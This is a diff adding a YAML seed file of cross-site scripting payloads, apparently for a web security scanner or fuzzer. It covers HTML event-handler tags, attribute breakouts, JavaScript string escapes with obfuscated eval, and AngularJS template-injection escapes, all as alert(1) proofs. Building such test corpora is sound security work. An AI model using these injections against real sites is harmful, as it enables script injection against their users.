@@ -1,0 +1,97 @@
+# XSS payload expansion: event-handler library, encoding bypasses, more contexts
+seeds:
+  xss:
+    html:
+      - raw: "<img src=x onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "<img src=x onerror=alert(document.domain)>"
+        ctx: ["all"]
+      - raw: "<svg/onload=alert(1)>"
+        ctx: ["all"]
+      - raw: "<svg><script>alert(1)</script></svg>"
+        ctx: ["all"]
+      - raw: "<details open ontoggle=alert(1)>"
+        ctx: ["all"]
+      - raw: "<input onfocus=alert(1) autofocus>"
+        ctx: ["all"]
+      - raw: "<select onfocus=alert(1) autofocus>"
+        ctx: ["all"]
+      - raw: "<video><source onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "<iframe srcdoc='<script>alert(1)</script>'>"
+        ctx: ["all"]
+      - raw: "<a href=javascript:alert(1)>click</a>"
+        ctx: ["all"]
+      - raw: "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "<template><img src=x onerror=alert(1)></template>"
+        ctx: ["all"]
+      - raw: "<svg><animate onbegin=alert(1) attributeName=x dur=1s>"
+        ctx: ["all"]
+      - raw: "<svg><set attributeName=onmouseover onbegin=alert(1)>"
+        ctx: ["all"]
+      - raw: "<xss id=x onfocus=alert(1) tabindex=1>#x</xss>"
+        ctx: ["all"]
+      - raw: "<object data='javascript:alert(1)'>"
+        ctx: ["all"]
+      - raw: "<embed src='javascript:alert(1)'>"
+        ctx: ["all"]
+      - raw: "<form action=javascript:alert(1)><button>click</button></form>"
+        ctx: ["all"]
+      - raw: "<math><annotation-xml encoding='text/html'><img src=x onerror=alert(1)>"
+        ctx: ["all"]
+      - raw: "<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>click</text></a></svg>"
+        ctx: ["all"]
+      - raw: "<iframe src=javascript:alert(1)>"
+        ctx: ["all"]
+    attr:
+      - raw: "\\\" autofocus onfocus=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" onmouseover=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" onclick=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" onpointerenter=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" onanimationstart=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" oninput=alert(1) autofocus x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" onkeydown=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "\\\" ondblclick=alert(1) x=\\\""
+        ctx: ["all"]
+      - raw: "javascript:alert(1)"
+        ctx: ["all"]
+      - raw: "jav&#x61;script:alert(1)"
+        ctx: ["all"]
+      - raw: "&Tab;onfocus=alert(1) autofocus"
+        ctx: ["all"]
+    js:
+      - raw: "';alert(1)//"
+        ctx: ["all"]
+      - raw: "\\';alert(1);//"
+        ctx: ["all"]
+      - raw: "</script><script>alert(1)</script>"
+        ctx: ["all"]
+      - raw: "';top['al'%2b'ert'](1);//"
+        ctx: ["all"]
+      - raw: "';new Function('alert(1)')();//"
+        ctx: ["all"]
+      - raw: "';eval(atob('YWxlcnQoMSk='));//"
+        ctx: ["all"]
+      - raw: "${alert(1)}"
+        ctx: ["all"]
+      - raw: "`;alert(1);//"
+        ctx: ["all"]
+      - raw: "';import('data:text/javascript,alert(1)');//"
+        ctx: ["all"]
+    angular:
+      - raw: "{{constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{[].constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{$eval.constructor('alert(1)')()}}"
+        ctx: ["all"]
+      - raw: "{{x=['a'];x.constructor.constructor('alert(1)')()}}"
+        ctx: ["all"]
